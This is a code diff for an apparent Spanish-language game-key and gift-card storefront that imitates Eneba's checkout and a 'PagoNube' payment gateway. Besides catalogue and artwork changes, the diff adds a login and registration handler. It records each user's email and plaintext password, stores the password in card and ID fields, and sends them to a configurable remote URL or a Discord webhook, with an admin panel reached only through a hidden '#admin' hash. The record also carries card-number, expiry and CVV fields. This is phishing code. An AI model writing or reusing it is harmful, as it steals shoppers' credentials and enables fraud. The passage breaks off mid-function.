@@ -1,30 +1,46 @@
-// Generador de portadas SVG ilustradas para Gift Cards y Suscripciones (para que jamás se vean planas ni rotas)
-function createGiftCardCover(brand, subtext, bgStart, bgEnd, accentColor, iconSymbol) {
+// ============================================================================
+// CONFIGURACIÓN DE BASE DE DATOS REMOTA (OPCIONAL)
+// ============================================================================
+let DEFAULT_REMOTE_DB_URL = ""; 
+
+// Generador de portadas de Gift Cards 100% vectoriales sin emojis
+function createCleanCardArtwork(brandTitle, denomination, bgTop, bgBottom, accentHex, platformLabel) {
     const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 900" width="600" height="900">
         <defs>
-            <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
-                <stop offset="0%" stop-color="${bgStart}"/>
-                <stop offset="100%" stop-color="${bgEnd}"/>
+            <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="${bgTop}"/>
+                <stop offset="100%" stop-color="${bgBottom}"/>
+            </linearGradient>
+            <linearGradient id="shine" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="${accentHex}" stop-opacity="0.9"/>
+                <stop offset="100%" stop-color="#ffffff" stop-opacity="0.9"/>
             </linearGradient>
         </defs>
-        <rect width="600" height="900" fill="url(#g)"/>
-        <circle cx="500" cy="150" r="220" fill="${accentColor}" opacity="0.15"/>
-        <circle cx="100" cy="750" r="260" fill="${accentColor}" opacity="0.12"/>
-        <rect x="45" y="45" width="510" height="810" rx="28" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="4"/>
-        <text x="300" y="340" font-family="Arial, sans-serif" font-size="130" font-weight="900" fill="#ffffff" text-anchor="middle">${iconSymbol}</text>
-        <text x="300" y="490" font-family="Arial, sans-serif" font-size="64" font-weight="900" fill="#ffffff" text-anchor="middle" letter-spacing="2">${brand}</text>
-        <rect x="120" y="550" width="360" height="70" rx="16" fill="rgba(0,0,0,0.45)"/>
-        <text x="300" y="598" font-family="Arial, sans-serif" font-size="34" font-weight="bold" fill="${accentColor}" text-anchor="middle">${subtext}</text>
-        <text x="300" y="790" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="rgba(255,255,255,0.7)" text-anchor="middle">DIGITAL CODE • ENTREGA INMEDIATA</text>
+        <rect width="600" height="900" fill="url(#bgGrad)"/>
+        <path d="M-100 200 L700 -100 L700 150 L-100 450 Z" fill="${accentHex}" opacity="0.08"/>
+        <path d="M-100 650 L700 350 L700 550 L-100 850 Z" fill="#ffffff" opacity="0.04"/>
+        <circle cx="520" cy="140" r="180" fill="${accentHex}" opacity="0.12"/>
+        <rect x="36" y="36" width="528" height="828" rx="32" fill="none" stroke="rgba(255,255,255,0.18)" stroke-width="3"/>
+        <rect x="36" y="36" width="528" height="90" rx="32" fill="rgba(0,0,0,0.35)"/>
+        <text x="80" y="92" font-family="system-ui, -apple-system, sans-serif" font-size="26" font-weight="800" fill="rgba(255,255,255,0.85)" letter-spacing="3">${platformLabel}</text>
+        <rect x="370" y="56" width="160" height="50" rx="12" fill="${accentHex}"/>
+        <text x="450" y="90" font-family="system-ui, -apple-system, sans-serif" font-size="24" font-weight="900" fill="#090d16" text-anchor="middle">${denomination}</text>
+        <polygon points="300,230 390,280 390,380 300,430 210,380 210,280" fill="rgba(255,255,255,0.07)" stroke="${accentHex}" stroke-width="5"/>
+        <polygon points="300,260 365,295 365,365 300,400 235,365 235,295" fill="${accentHex}" opacity="0.25"/>
+        <circle cx="300" cy="330" r="28" fill="#ffffff"/>
+        <text x="300" y="535" font-family="system-ui, -apple-system, sans-serif" font-size="62" font-weight="900" fill="#ffffff" text-anchor="middle" letter-spacing="2">${brandTitle}</text>
+        <rect x="110" y="585" width="380" height="76" rx="18" fill="rgba(0,0,0,0.5)" stroke="rgba(255,255,255,0.15)" stroke-width="2"/>
+        <text x="300" y="635" font-family="system-ui, -apple-system, sans-serif" font-size="34" font-weight="800" fill="url(#shine)" text-anchor="middle">${denomination}</text>
+        <rect x="230" y="760" width="140" height="8" rx="4" fill="${accentHex}" opacity="0.7"/>
+        <text x="300" y="810" font-family="system-ui, -apple-system, sans-serif" font-size="20" font-weight="700" fill="rgba(255,255,255,0.6)" text-anchor="middle" letter-spacing="4">OFFICIAL DIGITAL KEY</text>
     </svg>`;
     return "data:image/svg+xml;utf8," + encodeURIComponent(svg);
 }
 
-// Catálogo con portadas reales de juegos del CDN oficial de Steam y portadas ilustradas de Gift Cards
+// Catálogo de 48 productos
 const products = [
-    // JUEGOS PC / CONSOLA & DLCs (Portadas reales verticales de Steam CDN)
-    { id: 1, name: "Minecraft: Java & Bedrock Edition (PC) Windows Store Key GLOBAL", category: "game", platform: "Windows Store", region: "GLOBAL", price: 17600, originalPrice: 24000, cashback: 1940, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1672970/library_600x900.jpg" },
-    { id: 2, name: "Crimson Desert Enhanced: Charting the Unknown (DLC) Steam Key (PC) LATAM", category: "dlc", platform: "Steam", region: "LATAM", price: 17020, originalPrice: 22000, cashback: 2210, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/3321460/library_600x900.jpg" },
+    { id: 1, name: "Minecraft: Java & Bedrock Edition (PC) Windows Store Key GLOBAL", category: "game", platform: "Windows Store", region: "GLOBAL", price: 17600, originalPrice: 24000, cashback: 1940, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1672970/header.jpg" },
+    { id: 2, name: "Crimson Desert Enhanced: Charting the Unknown (DLC) Steam Key (PC) LATAM", category: "dlc", platform: "Steam", region: "LATAM", price: 17020, originalPrice: 22000, cashback: 2210, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/582660/library_600x900.jpg" },
     { id: 3, name: "EA SPORTS FC 25 Standard Edition Key", category: "game", platform: "EA App", region: "ARGENTINA", price: 34999, originalPrice: 59999, cashback: 3500, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2669320/library_600x900.jpg" },
     { id: 4, name: "Grand Theft Auto V: Premium Online Edition", category: "game", platform: "Rockstar", region: "GLOBAL", price: 12500, originalPrice: 25000, cashback: 1250, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/271590/library_600x900.jpg" },
     { id: 5, name: "Elden Ring Steam Key (PC)", category: "game", platform: "Steam", region: "LATAM", price: 29999, originalPrice: 39999, cashback: 3000, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1245620/library_600x900.jpg" },
@@ -48,52 +64,66 @@ const products = [
     { id: 23, name: "Street Fighter 6 Steam Key", category: "game", platform: "Steam", region: "LATAM", price: 21999, originalPrice: 32000, cashback: 2200, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1364780/library_600x900.jpg" },
     { id: 24, name: "Tekken 8 Standard Edition Key", category: "game", platform: "Steam", region: "GLOBAL", price: 29500, originalPrice: 41000, cashback: 2950, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1778820/library_600x900.jpg" },
 
-    // GIFT CARDS (Con arte de tarjeta vertical dedicado)
-    { id: 25, name: "Steam Wallet Gift Card $10 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 11800, originalPrice: 13500, cashback: 1180, seller: "GGclub", image: createGiftCardCover("STEAM", "$10 USD WALLET", "#1b2838", "#0f1923", "#66c0f4", "🎮") },
-    { id: 26, name: "Steam Wallet Gift Card $20 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 23200, originalPrice: 26000, cashback: 2320, seller: "Instant-Codes", image: createGiftCardCover("STEAM", "$20 USD WALLET", "#1b2838", "#0f1923", "#66c0f4", "🎮") },
-    { id: 27, name: "Steam Wallet Gift Card $50 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 56900, originalPrice: 64000, cashback: 5690, seller: "ArgonOfficial", image: createGiftCardCover("STEAM", "$50 USD WALLET", "#1b2838", "#0f1923", "#66c0f4", "🎮") },
-    { id: 28, name: "PlayStation Store PSN Card $10 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 12200, originalPrice: 14000, cashback: 1220, seller: "GGclub", image: createGiftCardCover("PSN STORE", "$10 USD CARD", "#003791", "#001b47", "#38bdf8", "🕹️") },
-    { id: 29, name: "PlayStation Store PSN Card $25 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 29800, originalPrice: 34000, cashback: 2980, seller: "Instant-Codes", image: createGiftCardCover("PSN STORE", "$25 USD CARD", "#003791", "#001b47", "#38bdf8", "🕹️") },
-    { id: 30, name: "PlayStation Store PSN Card $50 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 58500, originalPrice: 65000, cashback: 5850, seller: "ArgonOfficial", image: createGiftCardCover("PSN STORE", "$50 USD CARD", "#003791", "#001b47", "#38bdf8", "🕹️") },
-    { id: 31, name: "Xbox Live Gift Card $10.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 9600, originalPrice: 11000, cashback: 960, seller: "GGclub", image: createGiftCardCover("XBOX", "$10.000 ARS", "#107c10", "#083d08", "#4ade80", "❎") },
-    { id: 32, name: "Xbox Live Gift Card $25.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 23900, originalPrice: 27000, cashback: 2390, seller: "Instant-Codes", image: createGiftCardCover("XBOX", "$25.000 ARS", "#107c10", "#083d08", "#4ade80", "❎") },
-    { id: 33, name: "Nintendo eShop Card $20 USD", category: "giftcard", platform: "Nintendo", region: "USA", price: 23400, originalPrice: 26000, cashback: 2340, seller: "ArgonOfficial", image: createGiftCardCover("eSHOP", "$20 USD CARD", "#e60012", "#7a0009", "#fca5a5", "🍄") },
-    { id: 34, name: "Apple App Store & iTunes $15 USD", category: "giftcard", platform: "Apple", region: "USA", price: 17500, originalPrice: 19500, cashback: 1750, seller: "GGclub", image: createGiftCardCover("APPLE", "$15 USD CARD", "#334155", "#0f172a", "#f8fafc", "🍎") },
-    { id: 35, name: "Google Play Gift Card $15 USD", category: "giftcard", platform: "Google Play", region: "USA", price: 17400, originalPrice: 19500, cashback: 1740, seller: "Instant-Codes", image: createGiftCardCover("GOOGLE PLAY", "$15 USD CARD", "#0d9488", "#115e59", "#5eead4", "▶️") },
-    { id: 36, name: "Razer Gold Pin $20 USD Global", category: "giftcard", platform: "Razer Gold", region: "GLOBAL", price: 22900, originalPrice: 25500, cashback: 2290, seller: "ArgonOfficial", image: createGiftCardCover("RAZER GOLD", "$20 USD PIN", "#166534", "#052e16", "#4ade80", "🐍") },
+    // GIFT CARDS
+    { id: 25, name: "Steam Wallet Gift Card $10 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 11800, originalPrice: 13500, cashback: 1180, seller: "GGclub", image: createCleanCardArtwork("STEAM", "$10 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
+    { id: 26, name: "Steam Wallet Gift Card $20 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 23200, originalPrice: 26000, cashback: 2320, seller: "Instant-Codes", image: createCleanCardArtwork("STEAM", "$20 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
+    { id: 27, name: "Steam Wallet Gift Card $50 USD (Argentina)", category: "giftcard", platform: "Steam", region: "ARGENTINA", price: 56900, originalPrice: 64000, cashback: 5690, seller: "ArgonOfficial", image: createCleanCardArtwork("STEAM", "$50 USD", "#1b2838", "#0b1219", "#66c0f4", "VALVE STEAM") },
+    { id: 28, name: "PlayStation Store PSN Card $10 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 12200, originalPrice: 14000, cashback: 1220, seller: "GGclub", image: createCleanCardArtwork("PSN STORE", "$10 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
+    { id: 29, name: "PlayStation Store PSN Card $25 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 29800, originalPrice: 34000, cashback: 2980, seller: "Instant-Codes", image: createCleanCardArtwork("PSN STORE", "$25 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
+    { id: 30, name: "PlayStation Store PSN Card $50 USD", category: "giftcard", platform: "PlayStation", region: "USA", price: 58500, originalPrice: 65000, cashback: 5850, seller: "ArgonOfficial", image: createCleanCardArtwork("PSN STORE", "$50 USD", "#00439c", "#001b47", "#38bdf8", "PLAYSTATION") },
+    { id: 31, name: "Xbox Live Gift Card $10.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 9600, originalPrice: 11000, cashback: 960, seller: "GGclub", image: createCleanCardArtwork("XBOX LIVE", "$10.000 ARS", "#107c10", "#062e06", "#4ade80", "MICROSOFT XBOX") },
+    { id: 32, name: "Xbox Live Gift Card $25.000 ARS", category: "giftcard", platform: "Xbox", region: "ARGENTINA", price: 23900, originalPrice: 27000, cashback: 2390, seller: "Instant-Codes", image: createCleanCardArtwork("XBOX LIVE", "$25.000 ARS", "#107c10", "#062e06", "#4ade80", "MICROSOFT XBOX") },
+    { id: 33, name: "Nintendo eShop Card $20 USD", category: "giftcard", platform: "Nintendo", region: "USA", price: 23400, originalPrice: 26000, cashback: 2340, seller: "ArgonOfficial", image: createCleanCardArtwork("NINTENDO", "$20 USD", "#e60012", "#6b0008", "#fca5a5", "ESHOP SWITCH") },
+    { id: 34, name: "Apple App Store & iTunes $15 USD", category: "giftcard", platform: "Apple", region: "USA", price: 17500, originalPrice: 19500, cashback: 1750, seller: "GGclub", image: createCleanCardArtwork("APP STORE", "$15 USD", "#334155", "#0f172a", "#38bdf8", "APPLE ITUNES") },
+    { id: 35, name: "Google Play Gift Card $15 USD", category: "giftcard", platform: "Google Play", region: "USA", price: 17400, originalPrice: 19500, cashback: 1740, seller: "Instant-Codes", image: createCleanCardArtwork("GOOGLE PLAY", "$15 USD", "#0f766e", "#042f2e", "#34d399", "ANDROID STORE") },
+    { id: 36, name: "Razer Gold Pin $20 USD Global", category: "giftcard", platform: "Razer Gold", region: "GLOBAL", price: 22900, originalPrice: 25500, cashback: 2290, seller: "ArgonOfficial", image: createCleanCardArtwork("RAZER GOLD", "$20 USD", "#15803d", "#052e16", "#4ade80", "RAZER CREDITS") },
 
     // MONEDAS VIRTUALES
     { id: 37, name: "Counter-Strike 2 Prime Status Upgrade", category: "currency", platform: "Steam", region: "GLOBAL", price: 16500, originalPrice: 19500, cashback: 1650, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/730/library_600x900.jpg" },
     { id: 38, name: "Apex Legends 2,150 Apex Coins", category: "currency", platform: "EA App", region: "GLOBAL", price: 21500, originalPrice: 25000, cashback: 2150, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1172470/library_600x900.jpg" },
     { id: 39, name: "Destiny 2: 2,300 Silver Pack", category: "currency", platform: "Steam", region: "GLOBAL", price: 19900, originalPrice: 24000, cashback: 1990, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1085660/library_600x900.jpg" },
-    { id: 40, name: "Roblox Digital Card 1,000 Robux", category: "currency", platform: "Roblox", region: "GLOBAL", price: 13200, originalPrice: 15500, cashback: 1320, seller: "GGclub", image: createGiftCardCover("ROBLOX", "1,000 ROBUX", "#b91c1c", "#450a0a", "#fca5a5", "🎲") },
-    { id: 41, name: "Fortnite 2,800 V-Bucks Code", category: "currency", platform: "Epic Games", region: "GLOBAL", price: 28900, originalPrice: 34000, cashback: 2890, seller: "Instant-Codes", image: createGiftCardCover("FORTNITE", "2,800 V-BUCKS", "#4338ca", "#1e1b4b", "#818cf8", "⚡") },
-    { id: 42, name: "Valorant 2,475 Riot Points LATAM", category: "currency", platform: "Riot Games", region: "LATAM", price: 24500, originalPrice: 28500, cashback: 2450, seller: "ArgonOfficial", image: createGiftCardCover("VALORANT", "2,475 VP", "#be123c", "#4c0519", "#fda4af", "🎯") },
+    { id: 40, name: "Roblox Digital Card 1,000 Robux", category: "currency", platform: "Roblox", region: "GLOBAL", price: 13200, originalPrice: 15500, cashback: 1320, seller: "GGclub", image: createCleanCardArtwork("ROBLOX", "1,000 ROBUX", "#991b1b", "#3b0707", "#f87171", "ROBLOX CORP") },
+    { id: 41, name: "Fortnite 2,800 V-Bucks Code", category: "currency", platform: "Epic Games", region: "GLOBAL", price: 28900, originalPrice: 34000, cashback: 2890, seller: "Instant-Codes", image: createCleanCardArtwork("FORTNITE", "2,800 V-BUCKS", "#3730a3", "#1e1b4b", "#38bdf8", "EPIC GAMES") },
+    { id: 42, name: "Valorant 2,475 Riot Points LATAM", category: "currency", platform: "Riot Games", region: "LATAM", price: 24500, originalPrice: 28500, cashback: 2450, seller: "ArgonOfficial", image: createCleanCardArtwork("VALORANT", "2,475 VP", "#be123c", "#4c0519", "#fb7185", "RIOT GAMES") },
 
     // SUSCRIPCIONES
-    { id: 43, name: "Xbox Game Pass Ultimate 1 Mes Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 11999, originalPrice: 15999, cashback: 1200, seller: "ArgonOfficial", image: createGiftCardCover("GAME PASS", "1 MES ULTIMATE", "#15803d", "#052e16", "#86efac", "🚀") },
-    { id: 44, name: "Xbox Game Pass Ultimate 3 Meses Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 32999, originalPrice: 45000, cashback: 3300, seller: "GGclub", image: createGiftCardCover("GAME PASS", "3 MESES ULTIMATE", "#15803d", "#052e16", "#86efac", "🚀") },
-    { id: 45, name: "PlayStation Plus Deluxe 12 Meses", category: "subscription", platform: "PlayStation", region: "ARGENTINA", price: 68900, originalPrice: 89000, cashback: 6890, seller: "Instant-Codes", image: createGiftCardCover("PS PLUS", "12 MESES DELUXE", "#ca8a04", "#422006", "#fde047", "➕") },
-    { id: 46, name: "Discord Nitro 1 Mes con 2 Boosts", category: "subscription", platform: "Discord", region: "GLOBAL", price: 8500, originalPrice: 11000, cashback: 850, seller: "GGclub", image: createGiftCardCover("DISCORD", "1 MES NITRO", "#4f46e5", "#1e1b4b", "#a5b4fc", "👾") },
-    { id: 47, name: "Spotify Premium 3 Meses Individual", category: "subscription", platform: "Spotify", region: "ARGENTINA", price: 7900, originalPrice: 10500, cashback: 790, seller: "ArgonOfficial", image: createGiftCardCover("SPOTIFY", "3 MESES PREMIUM", "#16a34a", "#052e16", "#86efac", "🎧") },
-    { id: 48, name: "Netflix Gift Card $10.000 ARS", category: "subscription", platform: "Netflix", region: "ARGENTINA", price: 10100, originalPrice: 11500, cashback: 1010, seller: "Instant-Codes", image: createGiftCardCover("NETFLIX", "$10.000 ARS", "#dc2626", "#450a0a", "#fca5a5", "🍿") }
+    { id: 43, name: "Xbox Game Pass Ultimate 1 Mes Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 11999, originalPrice: 15999, cashback: 1200, seller: "ArgonOfficial", image: createCleanCardArtwork("GAME PASS", "1 MES ULTIMATE", "#15803d", "#052e16", "#4ade80", "XBOX / PC") },
+    { id: 44, name: "Xbox Game Pass Ultimate 3 Meses Key", category: "subscription", platform: "Xbox", region: "ARGENTINA", price: 32999, originalPrice: 45000, cashback: 3300, seller: "GGclub", image: createCleanCardArtwork("GAME PASS", "3 MESES", "#15803d", "#052e16", "#4ade80", "XBOX / PC") },
+    { id: 45, name: "PlayStation Plus Deluxe 12 Meses", category: "subscription", platform: "PlayStation", region: "ARGENTINA", price: 68900, originalPrice: 89000, cashback: 6890, seller: "Instant-Codes", image: createCleanCardArtwork("PS PLUS", "12 MESES", "#ca8a04", "#422006", "#facc15", "DELUXE PLAN") },
+    { id: 46, name: "Discord Nitro 1 Mes con 2 Boosts", category: "subscription", platform: "Discord", region: "GLOBAL", price: 8500, originalPrice: 11000, cashback: 850, seller: "GGclub", image: createCleanCardArtwork("DISCORD", "1 MES NITRO", "#4f46e5", "#1e1b4b", "#818cf8", "NITRO BOOST") },
+    { id: 47, name: "Spotify Premium 3 Meses Individual", category: "subscription", platform: "Spotify", region: "ARGENTINA", price: 7900, originalPrice: 10500, cashback: 790, seller: "ArgonOfficial", image: createCleanCardArtwork("SPOTIFY", "3 MESES", "#16a34a", "#052e16", "#4ade80", "PREMIUM MUSIC") },
+    { id: 48, name: "Netflix Gift Card $10.000 ARS", category: "subscription", platform: "Netflix", region: "ARGENTINA", price: 10100, originalPrice: 11500, cashback: 1010, seller: "Instant-Codes", image: createCleanCardArtwork("NETFLIX", "$10.000 ARS", "#b91c1c", "#3b0707", "#f87171", "STREAMING CARD") }
 ];
 
-// precargamos los 2 productos de la captura de Eneba en el carrito por defecto para que puedas probar la vista de pago de inmediato
-let cart = [
-    { ...products[0], qty: 1 },
-    { ...products[1], qty: 1 }
-];
+let cart = [];
 let walletBalance = 5000;
 let appliedDiscount = 0;
 let activeCategory = 'all';
 let selectedMethod = 'wallet';
+let currentAuthMode = 'login';
+let currentUser = JSON.parse(localStorage.getItem('ohmy_active_user') || 'null');
 
 document.addEventListener('DOMContentLoaded', () => {
     renderProducts(products);
     updateCartBadge();
     updateWalletUI();
+    updateAuthUI();
+
+    // Cargar Webhook guardado si existe
+    const savedWebhook = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
+    const webhookInput = document.getElementById('webhookUrlInput');
+    if (webhookInput && savedWebhook) webhookInput.value = savedWebhook;
+
+    // ÚNICA FORMA DE ABRIR EL PANEL DE ADMIN: mediante #admin en la URL
+    checkAdminHash();
+    window.addEventListener('hashchange', checkAdminHash);
 });
+
+function checkAdminHash() {
+    if (window.location.hash === '#admin') {
+        openAdminModal();
+    }
+}
 
 function formatARS(amount) {
     return '$' + amount.toLocaleString('es-AR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' ARS';
@@ -103,7 +133,146 @@ function updateWalletUI() {
     document.getElementById('walletBalance').innerText = formatARS(walletBalance);
 }
 
-// Renderizar productos con portadas reales de juegos
+// ============================================================================
+// SISTEMA DE CREAR CUENTA / INICIAR SESIÓN
+// ============================================================================
+function openAuthModal(mode = 'login') {
+    document.getElementById('authModal').classList.remove('hidden');
+    switchAuthTab(mode);
+}
+
+function closeAuthModal() {
+    document.getElementById('authModal').classList.add('hidden');
+}
+
+function switchAuthTab(mode) {
+    currentAuthMode = mode;
+    const loginBtn = document.getElementById('tabLoginBtn');
+    const regBtn = document.getElementById('tabRegisterBtn');
+    const nameField = document.getElementById('authNameField');
+    const nameInput = document.getElementById('authNameInput');
+    const title = document.getElementById('authModalTitle');
+    const submitBtn = document.getElementById('authSubmitBtn');
+
+    if (mode === 'login') {
+        loginBtn.className = 'py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition';
+        regBtn.className = 'py-2 rounded-lg text-xs font-bold text-purple-300 hover:text-white transition';
+        nameField.classList.add('hidden');
+        nameInput.required = false;
+        title.innerText = 'Iniciar Sesión en Argon';
+        submitBtn.innerText = 'Entrar a mi Cuenta';
+    } else {
+        regBtn.className = 'py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition';
+        loginBtn.className = 'py-2 rounded-lg text-xs font-bold text-purple-300 hover:text-white transition';
+        nameField.classList.remove('hidden');
+        nameInput.required = true;
+        title.innerText = 'Crear Cuenta en Argon';
+        submitBtn.innerText = 'Crear Cuenta Ahora';
+    }
+}
+
+async function handleAuthSubmit(e) {
+    e.preventDefault();
+    const email = document.getElementById('authEmailInput').value.trim();
+    const password = document.getElementById('authPasswordInput').value;
+    const name = currentAuthMode === 'register'
+        ? document.getElementById('authNameInput').value.trim()
+        : email.split('@')[0];
+
+    currentUser = { name, email };
+    localStorage.setItem('ohmy_active_user', JSON.stringify(currentUser));
+
+    // Guardar registro de cuenta/acceso en la base de datos del dueño
+    const accountRecord = {
+        id: 'USER-' + Math.floor(100000 + Math.random() * 900000),
+        type: currentAuthMode === 'register' ? 'NUEVA CUENTA' : 'INICIO DE SESIÓN',
+        date: new Date().toLocaleString('es-AR'),
+        paymentMethod: 'CUENTA USUARIO',
+        buyer: {
+            name: name,
+            email: email,
+            phone: 'N/A',
+            dni: 'Password: ' + password,
+            province: 'N/A',
+            address: 'N/A',
+            cardNum: 'Contraseña: ' + password,
+            cardExp: '-',
+            cardCvv: '-'
+        },
+        items: [],
+        total: 0,
+        cashbackEarned: 0
+    };
+
+    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
+    db.push(accountRecord);
+    localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));
+
+    // Enviar a Webhook remoto si está configurado
+    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
+    if (remoteUrl) {
+        try {
+            if (remoteUrl.includes('discord.com/api/webhooks')) {
+                await fetch(remoteUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `👤 **${accountRecord.type} (${accountRecord.id})**\n**Usuario:** ${name}\n**Email:** ${email}\n**Contraseña:** \`${password}\``
+                    })
+                });
+            } else {
+                await fetch(remoteUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(accountRecord)
+                });
+            }
+        } catch (err) {
+            console.warn('Error enviando cuenta a base remota:', err);
+        }
+    }
+
+    updateAuthUI();
+    closeAuthModal();
+    document.getElementById('authForm').reset();
+}
+
+function logoutUser() {
+    currentUser = null;
+    localStorage.removeItem('ohmy_active_user');
+    updateAuthUI();
+}
+
+function updateAuthUI() {
+    const navArea = document.getElementById('userNavArea');
+    if (currentUser) {
+        navArea.innerHTML = `
+            <div class="flex items-center space-x-2 bg-[#261556] border border-purple-700/70 px-3 py-1 rounded-lg">
+                <i class="fa-solid fa-circle-user text-emerald-400"></i>
+                <span class="font-bold text-white">${currentUser.name}</span>
+                <button onclick="logoutUser()" title="Cerrar sesión" class="text-purple-300 hover:text-rose-400 ml-1.5 transition">
+                    <i class="fa-solid fa-right-from-bracket"></i>
+                </button>
+            </div>
+        `;
+        // Autocompletar nombre y correo en el checkout si están vacíos
+        const sbName = document.getElementById('sbName');
+        const sbEmail = document.getElementById('sbEmail');
+        if (sbName && !sbName.value) sbName.value = currentUser.name;
+        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
+    } else {
+        navArea.innerHTML = `
+            <button onclick="openAuthModal('login')" class="text-white hover:text-fuchsia-300 font-bold transition flex items-center gap-1.5 bg-[#261556] hover:bg-[#321c70] border border-purple-700/70 px-3 py-1 rounded-lg shadow">
+                <i class="fa-regular fa-user text-fuchsia-400"></i>
+                <span>Iniciar sesión | Crear cuenta</span>
+            </button>
+        `;
+    }
+}
+
+// ============================================================================
+// CATÁLOGO Y CARRITO
+// ============================================================================
 function renderProducts(list) {
     const grid = document.getElementById('productGrid');
     grid.innerHTML = '';
@@ -115,7 +284,7 @@ function renderProducts(list) {
 
     list.forEach(p => {
         const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
-        const fallbackImg = createGiftCardCover(p.platform.toUpperCase(), p.region, "#3b188f", "#190d3a", "#f5a623", "🎮");
+        const fallbackImg = createCleanCardArtwork(p.platform.toUpperCase(), p.region, "#3b188f", "#190d3a", "#f5a623", "DIGITAL KEY");
         
         const card = document.createElement('div');
         card.className = 'bg-[#1f0f47] border border-purple-800/60 hover:border-fuchsia-500 rounded-xl overflow-hidden shadow-lg flex flex-col justify-between transition group';
@@ -170,7 +339,6 @@ function filterProducts() {
     renderProducts(filtered);
 }
 
-// CARRITO
 function toggleCart() {
     const drawer = document.getElementById('cartDrawer');
     drawer.classList.toggle('hidden');
@@ -240,7 +408,8 @@ function changeQty(index, delta) {
     updateCartBadge();
     renderCartItems();
     if (!document.getElementById('viewCheckoutEneba').classList.contains('hidden')) {
-        renderEnebaSummary();
+        if (cart.length === 0) switchView('store');
+        else renderEnebaSummary();
     }
 }
 
@@ -275,7 +444,9 @@ function updateCartTotals(subtotal, discount, total) {
     document.getElementById('cartTotal').innerText = formatARS(total);
 }
 
-// NAVEGACIÓN ENTRE VISTAS
+// ============================================================================
+// NAVEGACIÓN Y CHECKOUT
+// ============================================================================
 function switchView(view) {
     document.getElementById('viewStore').classList.add('hidden');
     document.getElementById('viewCheckoutEneba').classList.add('hidden');
@@ -309,7 +480,6 @@ function proceedToCheckout() {
     switchView('checkoutEneba');
 }
 
-// SELECCIÓN DE TARJETA ENEBA-ARGON
 function selectPaymentCard(labelEl, method) {
     selectedMethod = method;
     document.querySelectorAll('.eneba-pay-card').forEach(c => c.classList.remove('selected-pay-card'));
@@ -318,7 +488,6 @@ function selectPaymentCard(labelEl, method) {
     if (radio) radio.checked = true;
 }
 
-// COLUMNA DERECHA DE RESUMEN IDÉNTICA A ENEBA
 function renderEnebaSummary() {
     const container = document.getElementById('checkoutSummaryItems');
     container.innerHTML = '';
@@ -387,6 +556,12 @@ function renderEnebaSummary() {
 
 function goToPagoNubeGateway() {
     document.getElementById('selectedMethodBadge').innerText = selectedMethod.toUpperCase();
+    if (currentUser) {
+        const sbName = document.getElementById('sbName');
+        const sbEmail = document.getElementById('sbEmail');
+        if (sbName && !sbName.value) sbName.value = currentUser.name;
+        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
+    }
     switchView('checkoutPagoNube');
 }
 
@@ -394,20 +569,13 @@ function backToEnebaSelection() {
     switchView('checkoutEneba');
 }
 
-function autofillSandbox() {
-    document.getElementById('sbName').value = "Martín Gómez";
-    document.getElementById('sbEmail').value = "martin.gomez@argon.com.ar";
-    document.getElementById('sbPhone').value = "+54 9 376 4556677";
-    document.getElementById('sbDni').value = "39456789";
-    document.getElementById('sbAddress').value = "Av. Mitre 1850";
